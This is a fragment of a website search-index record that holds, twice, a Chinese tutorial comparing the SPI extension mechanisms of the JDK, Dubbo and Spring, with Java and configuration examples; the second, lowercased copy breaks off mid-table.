SPI",slug:"spring-spi",normalizedTitle:"spring spi",charIndex:40},{level:2,title:"对比",slug:"对比",normalizedTitle:"对比",charIndex:54},{level:2,title:"SPI 的使用",slug:"spi-的使用",normalizedTitle:"spi 的使用",charIndex:60},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:71}],headersStr:"SPI 有什么用？ JDK SPI Dubbo SPI Spring SPI 对比 SPI 的使用 参考",content:' * SPI 有什么用？\n * JDK SPI\n * Dubbo SPI\n * Spring SPI\n * 对比\n * SPI 的使用\n * 参考\n\n\n\n> SPI 全称为 Service Provider Interface，是一种服务发现机制。SPI 的本质是将接口实现类的全限定名配置在文件中，并由服务加载器读取配置文件，加载实现类。这样可以在运行时，动态为接口替换实现类。正因此特性，我们可以很容易的通过 SPI 机制为我们的程序提供拓展功能。\n\n本文主要是特性 & 用法介绍，不涉及源码解析（源码都很简单，相信你一定一看就懂）\n\n\n# SPI 有什么用？\n\n举个栗子，现在我们设计了一款全新的日志框架：super-logger。默认以XML文件作为我们这款日志的配置文件，并设计了一个配置文件解析的接口：\n\npackage com.github.kongwu.spisamples;\n\npublic interface SuperLoggerConfiguration {\n\tvoid configure(String configFile);\n}\n\n\n1\n2\n3\n4\n5\n\n\n然后来一个默认的XML实现：\n\npackage com.github.kongwu.spisamples;\n\npublic class XMLConfiguration implements SuperLoggerConfiguration{\n\tpublic void configure(String configFile){\n    \t......\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n那么我们在初始化，解析配置时，只需要调用这个XMLConfiguration来解析XML配置文件即可。\n\npackage com.github.kongwu.spisamples;\n\npublic class LoggerFactory {\n    static {\n        SuperLoggerConfiguration configuration = new XMLConfiguration();\n    \tconfiguration.configure(configFile);\n    }\n\n    public static getLogger(Class clazz){\n    \t......\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n这样就完成了一个基础的模型，看起来也没什么问题。不过扩展性不太好，因为如果想定制/扩展/重写解析功能的话，我还得重新定义入口的代码，LoggerFactory 也得重写，不够灵活，侵入性太强了。\n\n比如现在用户/使用方想增加一个 yml 文件的方式，作为日志配置文件，那么只需要新建一个YAMLConfiguration，实现 SuperLoggerConfiguration 就可以。但是……怎么注入呢，怎么让 LoggerFactory中使用新建的这个 YAMLConfiguration ？难不成连 LoggerFactory 也重写了？\n\n如果借助SPI机制的话，这个事情就很简单了，可以很方便的完成这个入口的扩展功能。\n\n下面就先来看看，利用JDK 的 SPI 机制怎么解决上面的扩展性问题。\n\n\n# JDK SPI\n\nJDK 中 提供了一个 SPI 的功能，核心类是 java.util.ServiceLoader。其作用就是，可以通过类名获取在"META-INF/services/"下的多个配置实现文件。\n\n为了解决上面的扩展问题，现在我们在META-INF/services/下创建一个com.github.kongwu.spisamples.SuperLoggerConfiguration文件（没有后缀）。文件中只有一行代码，那就是我们默认的com.github.kongwu.spisamples.XMLConfiguration（注意，一个文件里也可以写多个实现，回车分隔）\n\nMETA-INF/services/com.github.kongwu.spisamples.SuperLoggerConfiguration:\n\ncom.github.kongwu.spisamples.XMLConfigurationCOPY\n\n\n1\n2\n3\n\n\n然后通过 ServiceLoader 获取我们的 SPI 机制配置的实现类：\n\nServiceLoader<SuperLoggerConfiguration> serviceLoader = ServiceLoader.load(SuperLoggerConfiguration.class);\nIterator<SuperLoggerConfiguration> iterator = serviceLoader.iterator();\nSuperLoggerConfiguration configuration;\n\nwhile(iterator.hasNext()) {\n    //加载并初始化实现类\n\tconfiguration = iterator.next();\n}\n\n//对最后一个configuration类调用configure方法\nconfiguration.configure(configFile);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n最后在调整LoggerFactory中初始化配置的方式为现在的SPI方式：\n\npackage com.github.kongwu.spisamples;\n\npublic class LoggerFactory {\n\tstatic {\n        ServiceLoader<SuperLoggerConfiguration> serviceLoader = ServiceLoader.load(SuperLoggerConfiguration.class);\n        Iterator<SuperLoggerConfiguration> iterator = serviceLoader.iterator();\n        SuperLoggerConfiguration configuration;\n\n        while(iterator.hasNext()) {\n            configuration = iterator.next();//加载并初始化实现类\n        }\n        configuration.configure(configFile);\n    }\n    \n    public static getLogger(Class clazz){\n    \t......\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n等等，这里为什么是用 iterator ? 而不是get之类的只获取一个实例的方法？\n\n试想一下，如果是一个固定的get方法，那么get到的是一个固定的实例，SPI 还有什么意义呢？\n\nSPI 的目的，就是增强扩展性。将固定的配置提取出来，通过 SPI 机制来配置。那既然如此，一般都会有一个默认的配置，然后通过 SPI 的文件配置不同的实现，这样就会存在一个接口多个实现的问题。要是找到多个实现的话，用哪个实现作为最后的实例呢？\n\n所以这里使用iterator来获取所有的实现类配置。刚才已经在我们这个 super-logger 包里增加了默认的SuperLoggerConfiguration 实现。\n\n为了支持 YAML 配置，现在在使用方/用户的代码里，增加一个YAMLConfiguration的 SPI 配置：\n\nMETA-INF/services/com.github.kongwu.spisamples.SuperLoggerConfiguration:\n\ncom.github.kongwu.spisamples.ext.YAMLConfiguration\n\n\n1\n2\n3\n\n\n此时通过iterator方法，就会获取到默认的XMLConfiguration和我们扩展的这个YAMLConfiguration两个配置实现类了。\n\n在上面那段加载的代码里，我们遍历iterator，遍历到最后，我们使用最后一个实现配置作为最终的实例。\n\n再等等？最后一个？怎么算最后一个？\n\n使用方/用户自定义的的这个 YAMLConfiguration 一定是最后一个吗？\n\n这个真的不一定，取决于我们运行时的 ClassPath 配置，在前面加载的jar自然在前，最后的jar里的自然当然也在后面。所以如果用户的包在ClassPath中的顺序比super-logger的包更靠后，才会处于最后一个位置；如果用户的包位置在前，那么所谓的最后一个仍然是默认的XMLConfiguration。\n\n举个栗子，如果我们程序的启动脚本为：\n\njava -cp super-logger.jar:a.jar:b.jar:main.jar example.Main\n\n\n1\n\n\n默认的XMLConfiguration SPI配置在super-logger.jar，扩展的YAMLConfiguration SPI配置文件在main.jar，那么iterator获取的最后一个元素一定为YAMLConfiguration。\n\n但这个classpath顺序如果反了呢？main.jar 在前，super-logger.jar 在后\n\njava -cp main.jar:super-logger.jar:a.jar:b.jar example.Main\n\n\n1\n\n\n这样一来，iterator 获取的最后一个元素又变成了默认的XMLConfiguration，我们使用 JDK SPI 没啥意义了，获取的又是第一个，还是默认的XMLConfiguration。\n\n由于这个加载顺序（classpath）是由用户指定的，所以无论我们加载第一个还是最后一个，都有可能会导致加载不到用户自定义的那个配置。\n\n所以这也是JDK SPI机制的一个劣势，无法确认具体加载哪一个实现，也无法加载某个指定的实现，仅靠ClassPath的顺序是一个非常不严谨的方式\n\nJDK SPI机制的缺点是：会加载所有的实现类，需要知道接口的所有具体实现类，通过迭代的方式获取指定的实现类。（可能还会存在并发问题）\n\n\n# Dubbo SPI\n\n> Dubbo 就是通过 SPI 机制加载所有的组件。不过，Dubbo 并未使用 Java 原生的 SPI 机制，而是对其进行了增强，使其能够更好的满足需求。在 Dubbo 中，SPI 是一个非常重要的模块。基于 SPI，我们可以很容易的对 Dubbo 进行拓展。如果大家想要学习 Dubbo 的源码，SPI 机制务必弄懂。接下来，我们先来了解一下 Java SPI 与 Dubbo SPI 的用法，然后再来分析 Dubbo SPI 的源码。\n\nDubbo 中实现了一套新的 SPI 机制，功能更强大，也更复杂一些。相关逻辑被封装在了 ExtensionLoader 类中，通过 ExtensionLoader，我们可以加载指定的实现类。Dubbo SPI 所需的配置文件需放置在 META-INF/dubbo 路径下，配置内容如下（以下demo来自dubbo官方文档）。\n\noptimusPrime = org.apache.spi.OptimusPrime\nbumblebee = org.apache.spi.Bumblebee\n\n\n1\n2\n\n\n与 Java SPI 实现类配置不同，Dubbo SPI 是通过键值对的方式进行配置，这样我们可以按需加载指定的实现类。另外在使用时还需要在接口上标注 @SPI 注解。下面来演示 Dubbo SPI 的用法：\n\n@SPI\npublic interface Robot {\n    void sayHello();\n}\n\npublic class OptimusPrime implements Robot {\n\n    @Override\n    public void sayHello() {\n        System.out.println("Hello, I am Optimus Prime.");\n    }\n}\n\npublic class Bumblebee implements Robot {\n\n    @Override\n    public void sayHello() {\n        System.out.println("Hello, I am Bumblebee.");\n    }\n}\n\npublic class DubboSPITest {\n\n    @Test\n    public void sayHello() throws Exception {\n        ExtensionLoader<Robot> extensionLoader = \n            ExtensionLoader.getExtensionLoader(Robot.class);\n        Robot optimusPrime = extensionLoader.getExtension("optimusPrime");\n        optimusPrime.sayHello();\n        Robot bumblebee = extensionLoader.getExtension("bumblebee");\n        bumblebee.sayHello();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nDubbo SPI 和 JDK SPI 最大的区别就在于支持“别名”，可以通过某个扩展点的别名来获取固定的扩展点。就像上面的例子中，我可以获取 Robot 多个 SPI 实现中别名为“optimusPrime”的实现，也可以获取别名为“bumblebee”的实现，这个功能非常有用！\n\n通过 @SPI 注解的 value 属性，还可以默认一个“别名”的实现。比如在Dubbo 中，默认的是Dubbo 私有协议：dubbo protocol – dubbo:// ** 来看看Dubbo中协议的接口：\n\n@SPI("dubbo")\npublic interface Protocol {\n\t......\n}\n\n\n1\n2\n3\n4\n\n\n在 Protocol 接口上，增加了一个 @SPI 注解，而注解的 value 值为 Dubbo ，通过 SPI 获取实现时就会获取 Protocol SPI 配置中别名为dubbo的那个实现，com.alibaba.dubbo.rpc.Protocol文件如下：\n\nfilter=com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper\nlistener=com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper\nmock=com.alibaba.dubbo.rpc.support.MockProtocol\n\ndubbo=com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol\n\ninjvm=com.alibaba.dubbo.rpc.protocol.injvm.InjvmProtocol\nrmi=com.alibaba.dubbo.rpc.protocol.rmi.RmiProtocol\nhessian=com.alibaba.dubbo.rpc.protocol.hessian.HessianProtocol\ncom.alibaba.dubbo.rpc.protocol.http.HttpProtocol\ncom.alibaba.dubbo.rpc.protocol.webservice.WebServiceProtocol\nthrift=com.alibaba.dubbo.rpc.protocol.thrift.ThriftProtocol\nmemcached=com.alibaba.dubbo.rpc.protocol.memcached.MemcachedProtocol\nredis=com.alibaba.dubbo.rpc.protocol.redis.RedisProtocol\nrest=com.alibaba.dubbo.rpc.protocol.rest.RestProtocol\nregistry=com.alibaba.dubbo.registry.integration.RegistryProtocol\nqos=com.alibaba.dubbo.qos.protocol.QosProtocolWrapper\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n然后只需要通过getDefaultExtension，就可以获取到 @SPI 注解上value对应的那个扩展实现了\n\nProtocol protocol = ExtensionLoader.getExtensionLoader(Protocol.class).getDefaultExtension();\n\n\n1\n\n\n还有一个 Adaptive 的机制，虽然非常灵活，但……用法并不是很“优雅”，这里就不介绍了\n\nDubbo 的 SPI 中还有一个“加载优先级”，优先加载内置（internal）的，然后加载外部的（external），按优先级顺序加载，如果遇到重复就跳过不会加载了。\n\n所以如果想靠classpath加载顺序去覆盖内置的扩展，也是个不太理智的做法，原因同上 – 加载顺序不严谨\n\n\n# Spring SPI\n\nSpring 的 SPI 配置文件是一个固定的文件 – META-INF/spring.factories，功能上和 JDK 的类似，每个接口可以有多个扩展实现，使用起来非常简单：\n\nList<LoggingSystemFactory> factories = \n    SpringFactoriesLoader.loadFactories(LoggingSystemFactory.class, classLoader);\n\n\n1\n2\n\n\n下面是一段 Spring Boot 中 spring.factories 的配置\n\n# Logging Systems\norg.springframework.boot.logging.LoggingSystemFactory=\\\norg.springframework.boot.logging.logback.LogbackLoggingSystem.Factory,\\\norg.springframework.boot.logging.log4j2.Log4J2LoggingSystem.Factory,\\\norg.springframework.boot.logging.java.JavaLoggingSystem.Factory\n\n# PropertySource Loaders\norg.springframework.boot.env.PropertySourceLoader=\\\norg.springframework.boot.env.PropertiesPropertySourceLoader,\\\norg.springframework.boot.env.YamlPropertySourceLoader\n\n# ConfigData Location Resolvers\norg.springframework.boot.context.config.ConfigDataLocationResolver=\\\norg.springframework.boot.context.config.ConfigTreeConfigDataLocationResolver,\\\norg.springframework.boot.context.config.StandardConfigDataLocationResolver\n\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nSpring SPI 中，将所有的配置放到一个固定的文件中，省去了配置一大堆文件的麻烦。至于多个接口的扩展配置，是用一个文件好，还是每个单独一个文件好这个，这个问题就见仁见智了（个人喜欢 Spring 这种，干净利落）。\n\nSpring的SPI 虽然属于spring-framework(core)，但是目前主要用在spring boot中……\n\n和前面两种 SPI 机制一样，Spring 也是支持 ClassPath 中存在多个 spring.factories 文件的，加载时会按照 classpath 的顺序依次加载这些 spring.factories 文件，添加到一个 ArrayList 中。由于没有别名，所以也没有去重的概念，有多少就添加多少。\n\n但由于 Spring 的 SPI 主要用在 Spring Boot 中，而 Spring Boot 中的 ClassLoader 会优先加载项目中的文件，而不是依赖包中的文件。所以如果在你的项目中定义个spring.factories文件，那么你项目中的文件会被第一个加载，得到的Factories中，项目中spring.factories里配置的那个实现类也会排在第一个\n\n如果我们要扩展某个接口的话，只需要在你的项目（spring boot）里新建一个META-INF/spring.factories文件，只添加你要的那个配置，不要完整的复制一遍 Spring Boot 的 spring.factories 文件然后修改 ** 比如我只想添加一个新的 LoggingSystemFactory 实现，那么我只需要新建一个META-INF/spring.factories文件，而不是完整的复制+修改：\n\norg.springframework.boot.logging.LoggingSystemFactory=\\\ncom.example.log4j2demo.Log4J2LoggingSystem.FactoryCOPY\n\n\n1\n2\n\n\n\n# 对比\n\n            JDK SPI           DUBBO SPI                                                   SPRING SPI\n文件方式        每个扩展点单独一个文件       每个扩展点单独一个文件                                                 所有的扩展点在一个文件\n获取某个固定的实现   不支持，只能按顺序获取所有实现   有“别名”的概念，可以通过名称获取扩展点的某个固定实现，配合Dubbo SPI的注解很方便               不支持，只能按顺序获取所有实现。但由于Spring Boot\n                                                                                          ClassLoader会优先加载用户代码中的文件，所以可以保证用户自定义的spring.factoires文件在第一个，通过获取第一个factory的方式就可以固定获取自定义的扩展\n其他          无                 支持Dubbo内部的依赖注入，通过目录来区分Dubbo 内置SPI和外部SPI，优先加载内部，保证内部的优先级最高   无\n文档完整度       文章 & 三方资料足够丰富     文档 & 三方资料足够丰富                                               文档不够丰富，但由于功能少，使用非常简单\nIDE支持       无                 无                                                           IDEA 完美支持，有语法提示\n\n三种 SPI 机制对比之下，JDK 内置的机制是最弱鸡的，但是由于是 JDK 内置，所以还是有一定应用场景，毕竟不用额外的依赖；Dubbo 的功能最丰富，但机制有点复杂了，而且只能配合 Dubbo 使用，不能完全算是一个独立的模块；Spring 的功能和JDK的相差无几，最大的区别是所有扩展点写在一个 spring.factories 文件中，也算是一个改进，并且 IDEA 完美支持语法提示。\n\n\n# SPI 的使用\n\n举个简单的例子：\n\n有个maven工程，分为三个项目：\n\n * 项目1有一个接口Pay.java\n * 项目2依赖项目1，有个实现类AliPay.java，在resources下创建META-INF.services包，采用SPI的方式暴露出实现类\n * 项目3依赖项目1，有个实现类WeiXinPay.java，在resources下创建META-INF.services包，采用SPI的方式暴露出实现类\n\n新建一个项目4，测试：\n\npublic static void main(String[] args) {\n    ServiceLoader<Pay> services = ServiceLoader.load(Pay.class);\n    for (Pay pay : services) {\n        pay.pay();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n * 若项目4依赖项目1和项目2，此时项目4用的实现类为AliPay\n * 若项目4依赖项目1和项目3，此时项目4用的实现类为WeiXinPay\n * 若项目4依赖项目1和项目2、项目3，此时项目4用的实现类为AliPay、WeiXinPay\n\n\n# 参考\n\n * Introduction to the Service Provider Interfaces – Oracle\n * Dubbo SPI – Apache Dubbo\n * Creating Your Own Auto-configuration – Spring',normalizedContent:' * spi 有什么用？\n * jdk spi\n * dubbo spi\n * spring spi\n * 对比\n * spi 的使用\n * 参考\n\n\n\n> spi 全称为 service provider interface，是一种服务发现机制。spi 的本质是将接口实现类的全限定名配置在文件中，并由服务加载器读取配置文件，加载实现类。这样可以在运行时，动态为接口替换实现类。正因此特性，我们可以很容易的通过 spi 机制为我们的程序提供拓展功能。\n\n本文主要是特性 & 用法介绍，不涉及源码解析（源码都很简单，相信你一定一看就懂）\n\n\n# spi 有什么用？\n\n举个栗子，现在我们设计了一款全新的日志框架：super-logger。默认以xml文件作为我们这款日志的配置文件，并设计了一个配置文件解析的接口：\n\npackage com.github.kongwu.spisamples;\n\npublic interface superloggerconfiguration {\n\tvoid configure(string configfile);\n}\n\n\n1\n2\n3\n4\n5\n\n\n然后来一个默认的xml实现：\n\npackage com.github.kongwu.spisamples;\n\npublic class xmlconfiguration implements superloggerconfiguration{\n\tpublic void configure(string configfile){\n    \t......\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n那么我们在初始化，解析配置时，只需要调用这个xmlconfiguration来解析xml配置文件即可。\n\npackage com.github.kongwu.spisamples;\n\npublic class loggerfactory {\n    static {\n        superloggerconfiguration configuration = new xmlconfiguration();\n    \tconfiguration.configure(configfile);\n    }\n\n    public static getlogger(class clazz){\n    \t......\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n这样就完成了一个基础的模型，看起来也没什么问题。不过扩展性不太好，因为如果想定制/扩展/重写解析功能的话，我还得重新定义入口的代码，loggerfactory 也得重写，不够灵活，侵入性太强了。\n\n比如现在用户/使用方想增加一个 yml 文件的方式，作为日志配置文件，那么只需要新建一个yamlconfiguration，实现 superloggerconfiguration 就可以。但是……怎么注入呢，怎么让 loggerfactory中使用新建的这个 yamlconfiguration ？难不成连 loggerfactory 也重写了？\n\n如果借助spi机制的话，这个事情就很简单了，可以很方便的完成这个入口的扩展功能。\n\n下面就先来看看，利用jdk 的 spi 机制怎么解决上面的扩展性问题。\n\n\n# jdk spi\n\njdk 中 提供了一个 spi 的功能，核心类是 java.util.serviceloader。其作用就是，可以通过类名获取在"meta-inf/services/"下的多个配置实现文件。\n\n为了解决上面的扩展问题，现在我们在meta-inf/services/下创建一个com.github.kongwu.spisamples.superloggerconfiguration文件（没有后缀）。文件中只有一行代码，那就是我们默认的com.github.kongwu.spisamples.xmlconfiguration（注意，一个文件里也可以写多个实现，回车分隔）\n\nmeta-inf/services/com.github.kongwu.spisamples.superloggerconfiguration:\n\ncom.github.kongwu.spisamples.xmlconfigurationcopy\n\n\n1\n2\n3\n\n\n然后通过 serviceloader 获取我们的 spi 机制配置的实现类：\n\nserviceloader<superloggerconfiguration> serviceloader = serviceloader.load(superloggerconfiguration.class);\niterator<superloggerconfiguration> iterator = serviceloader.iterator();\nsuperloggerconfiguration configuration;\n\nwhile(iterator.hasnext()) {\n    //加载并初始化实现类\n\tconfiguration = iterator.next();\n}\n\n//对最后一个configuration类调用configure方法\nconfiguration.configure(configfile);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n最后在调整loggerfactory中初始化配置的方式为现在的spi方式：\n\npackage com.github.kongwu.spisamples;\n\npublic class loggerfactory {\n\tstatic {\n        serviceloader<superloggerconfiguration> serviceloader = serviceloader.load(superloggerconfiguration.class);\n        iterator<superloggerconfiguration> iterator = serviceloader.iterator();\n        superloggerconfiguration configuration;\n\n        while(iterator.hasnext()) {\n            configuration = iterator.next();//加载并初始化实现类\n        }\n        configuration.configure(configfile);\n    }\n    \n    public static getlogger(class clazz){\n    \t......\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n等等，这里为什么是用 iterator ? 而不是get之类的只获取一个实例的方法？\n\n试想一下，如果是一个固定的get方法，那么get到的是一个固定的实例，spi 还有什么意义呢？\n\nspi 的目的，就是增强扩展性。将固定的配置提取出来，通过 spi 机制来配置。那既然如此，一般都会有一个默认的配置，然后通过 spi 的文件配置不同的实现，这样就会存在一个接口多个实现的问题。要是找到多个实现的话，用哪个实现作为最后的实例呢？\n\n所以这里使用iterator来获取所有的实现类配置。刚才已经在我们这个 super-logger 包里增加了默认的superloggerconfiguration 实现。\n\n为了支持 yaml 配置，现在在使用方/用户的代码里，增加一个yamlconfiguration的 spi 配置：\n\nmeta-inf/services/com.github.kongwu.spisamples.superloggerconfiguration:\n\ncom.github.kongwu.spisamples.ext.yamlconfiguration\n\n\n1\n2\n3\n\n\n此时通过iterator方法，就会获取到默认的xmlconfiguration和我们扩展的这个yamlconfiguration两个配置实现类了。\n\n在上面那段加载的代码里，我们遍历iterator，遍历到最后，我们使用最后一个实现配置作为最终的实例。\n\n再等等？最后一个？怎么算最后一个？\n\n使用方/用户自定义的的这个 yamlconfiguration 一定是最后一个吗？\n\n这个真的不一定，取决于我们运行时的 classpath 配置，在前面加载的jar自然在前，最后的jar里的自然当然也在后面。所以如果用户的包在classpath中的顺序比super-logger的包更靠后，才会处于最后一个位置；如果用户的包位置在前，那么所谓的最后一个仍然是默认的xmlconfiguration。\n\n举个栗子，如果我们程序的启动脚本为：\n\njava -cp super-logger.jar:a.jar:b.jar:main.jar example.main\n\n\n1\n\n\n默认的xmlconfiguration spi配置在super-logger.jar，扩展的yamlconfiguration spi配置文件在main.jar，那么iterator获取的最后一个元素一定为yamlconfiguration。\n\n但这个classpath顺序如果反了呢？main.jar 在前，super-logger.jar 在后\n\njava -cp main.jar:super-logger.jar:a.jar:b.jar example.main\n\n\n1\n\n\n这样一来，iterator 获取的最后一个元素又变成了默认的xmlconfiguration，我们使用 jdk spi 没啥意义了，获取的又是第一个，还是默认的xmlconfiguration。\n\n由于这个加载顺序（classpath）是由用户指定的，所以无论我们加载第一个还是最后一个，都有可能会导致加载不到用户自定义的那个配置。\n\n所以这也是jdk spi机制的一个劣势，无法确认具体加载哪一个实现，也无法加载某个指定的实现，仅靠classpath的顺序是一个非常不严谨的方式\n\njdk spi机制的缺点是：会加载所有的实现类，需要知道接口的所有具体实现类，通过迭代的方式获取指定的实现类。（可能还会存在并发问题）\n\n\n# dubbo spi\n\n> dubbo 就是通过 spi 机制加载所有的组件。不过，dubbo 并未使用 java 原生的 spi 机制，而是对其进行了增强，使其能够更好的满足需求。在 dubbo 中，spi 是一个非常重要的模块。基于 spi，我们可以很容易的对 dubbo 进行拓展。如果大家想要学习 dubbo 的源码，spi 机制务必弄懂。接下来，我们先来了解一下 java spi 与 dubbo spi 的用法，然后再来分析 dubbo spi 的源码。\n\ndubbo 中实现了一套新的 spi 机制，功能更强大，也更复杂一些。相关逻辑被封装在了 extensionloader 类中，通过 extensionloader，我们可以加载指定的实现类。dubbo spi 所需的配置文件需放置在 meta-inf/dubbo 路径下，配置内容如下（以下demo来自dubbo官方文档）。\n\noptimusprime = org.apache.spi.optimusprime\nbumblebee = org.apache.spi.bumblebee\n\n\n1\n2\n\n\n与 java spi 实现类配置不同，dubbo spi 是通过键值对的方式进行配置，这样我们可以按需加载指定的实现类。另外在使用时还需要在接口上标注 @spi 注解。下面来演示 dubbo spi 的用法：\n\n@spi\npublic interface robot {\n    void sayhello();\n}\n\npublic class optimusprime implements robot {\n\n    @override\n    public void sayhello() {\n        system.out.println("hello, i am optimus prime.");\n    }\n}\n\npublic class bumblebee implements robot {\n\n    @override\n    public void sayhello() {\n        system.out.println("hello, i am bumblebee.");\n    }\n}\n\npublic class dubbospitest {\n\n    @test\n    public void sayhello() throws exception {\n        extensionloader<robot> extensionloader = \n            extensionloader.getextensionloader(robot.class);\n        robot optimusprime = extensionloader.getextension("optimusprime");\n        optimusprime.sayhello();\n        robot bumblebee = extensionloader.getextension("bumblebee");\n        bumblebee.sayhello();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\ndubbo spi 和 jdk spi 最大的区别就在于支持“别名”，可以通过某个扩展点的别名来获取固定的扩展点。就像上面的例子中，我可以获取 robot 多个 spi 实现中别名为“optimusprime”的实现，也可以获取别名为“bumblebee”的实现，这个功能非常有用！\n\n通过 @spi 注解的 value 属性，还可以默认一个“别名”的实现。比如在dubbo 中，默认的是dubbo 私有协议：dubbo protocol – dubbo:// ** 来看看dubbo中协议的接口：\n\n@spi("dubbo")\npublic interface protocol {\n\t......\n}\n\n\n1\n2\n3\n4\n\n\n在 protocol 接口上，增加了一个 @spi 注解，而注解的 value 值为 dubbo ，通过 spi 获取实现时就会获取 protocol spi 配置中别名为dubbo的那个实现，com.alibaba.dubbo.rpc.protocol文件如下：\n\nfilter=com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper\nlistener=com.alibaba.dubbo.rpc.protocol.protocollistenerwrapper\nmock=com.alibaba.dubbo.rpc.support.mockprotocol\n\ndubbo=com.alibaba.dubbo.rpc.protocol.dubbo.dubboprotocol\n\ninjvm=com.alibaba.dubbo.rpc.protocol.injvm.injvmprotocol\nrmi=com.alibaba.dubbo.rpc.protocol.rmi.rmiprotocol\nhessian=com.alibaba.dubbo.rpc.protocol.hessian.hessianprotocol\ncom.alibaba.dubbo.rpc.protocol.http.httpprotocol\ncom.alibaba.dubbo.rpc.protocol.webservice.webserviceprotocol\nthrift=com.alibaba.dubbo.rpc.protocol.thrift.thriftprotocol\nmemcached=com.alibaba.dubbo.rpc.protocol.memcached.memcachedprotocol\nredis=com.alibaba.dubbo.rpc.protocol.redis.redisprotocol\nrest=com.alibaba.dubbo.rpc.protocol.rest.restprotocol\nregistry=com.alibaba.dubbo.registry.integration.registryprotocol\nqos=com.alibaba.dubbo.qos.protocol.qosprotocolwrapper\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n然后只需要通过getdefaultextension，就可以获取到 @spi 注解上value对应的那个扩展实现了\n\nprotocol protocol = extensionloader.getextensionloader(protocol.class).getdefaultextension();\n\n\n1\n\n\n还有一个 adaptive 的机制，虽然非常灵活，但……用法并不是很“优雅”，这里就不介绍了\n\ndubbo 的 spi 中还有一个“加载优先级”，优先加载内置（internal）的，然后加载外部的（external），按优先级顺序加载，如果遇到重复就跳过不会加载了。\n\n所以如果想靠classpath加载顺序去覆盖内置的扩展，也是个不太理智的做法，原因同上 – 加载顺序不严谨\n\n\n# spring spi\n\nspring 的 spi 配置文件是一个固定的文件 – meta-inf/spring.factories，功能上和 jdk 的类似，每个接口可以有多个扩展实现，使用起来非常简单：\n\nlist<loggingsystemfactory> factories = \n    springfactoriesloader.loadfactories(loggingsystemfactory.class, classloader);\n\n\n1\n2\n\n\n下面是一段 spring boot 中 spring.factories 的配置\n\n# logging systems\norg.springframework.boot.logging.loggingsystemfactory=\\\norg.springframework.boot.logging.logback.logbackloggingsystem.factory,\\\norg.springframework.boot.logging.log4j2.log4j2loggingsystem.factory,\\\norg.springframework.boot.logging.java.javaloggingsystem.factory\n\n# propertysource loaders\norg.springframework.boot.env.propertysourceloader=\\\norg.springframework.boot.env.propertiespropertysourceloader,\\\norg.springframework.boot.env.yamlpropertysourceloader\n\n# configdata location resolvers\norg.springframework.boot.context.config.configdatalocationresolver=\\\norg.springframework.boot.context.config.configtreeconfigdatalocationresolver,\\\norg.springframework.boot.context.config.standardconfigdatalocationresolver\n\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nspring spi 中，将所有的配置放到一个固定的文件中，省去了配置一大堆文件的麻烦。至于多个接口的扩展配置，是用一个文件好，还是每个单独一个文件好这个，这个问题就见仁见智了（个人喜欢 spring 这种，干净利落）。\n\nspring的spi 虽然属于spring-framework(core)，但是目前主要用在spring boot中……\n\n和前面两种 spi 机制一样，spring 也是支持 classpath 中存在多个 spring.factories 文件的，加载时会按照 classpath 的顺序依次加载这些 spring.factories 文件，添加到一个 arraylist 中。由于没有别名，所以也没有去重的概念，有多少就添加多少。\n\n但由于 spring 的 spi 主要用在 spring boot 中，而 spring boot 中的 classloader 会优先加载项目中的文件，而不是依赖包中的文件。所以如果在你的项目中定义个spring.factories文件，那么你项目中的文件会被第一个加载，得到的factories中，项目中spring.factories里配置的那个实现类也会排在第一个\n\n如果我们要扩展某个接口的话，只需要在你的项目（spring boot）里新建一个meta-inf/spring.factories文件，只添加你要的那个配置，不要完整的复制一遍 spring boot 的 spring.factories 文件然后修改 ** 比如我只想添加一个新的 loggingsystemfactory 实现，那么我只需要新建一个meta-inf/spring.factories文件，而不是完整的复制+修改：\n\norg.springframework.boot.logging.loggingsystemfactory=\\\ncom.example.log4j2demo.log4j2loggingsystem.factorycopy\n\n\n1\n2\n\n\n\n# 对比\n\n            jdk spi           dubbo spi                                                   spring spi\n文件方式        每个扩展点单独一个文件       每个扩展点单独一个文件                                                 所有的扩展点在一个文件\n获取某个固定的实现   不支持，只能按顺序获取所有实现   有“别名”的概念，可以通过名称获取扩展点的某个固定实现，配合dubbo spi的注解很方便               不支持，只能按顺序获取所有实现。但由于spring boot\n                                                                                          classloader会优先加载用户代码中的文件，所以可以保证用户自定义的spring.factoires文件在第一个，通过获取第一个factory的方式就可以固定获取自定义的扩展\n其他          无                 支持dubbo内部的依赖注入，通过目录来区分dubbo 内置spi和外部spi，优先加载内部，保证内部的优先级最高   无\n文档完整度       文章 & 三方资料足够丰富     文档 & 三方资料足够丰富                                               文档不够丰富，但由于功能少，使用非常简单\nide支持       无                 无                                                           idea 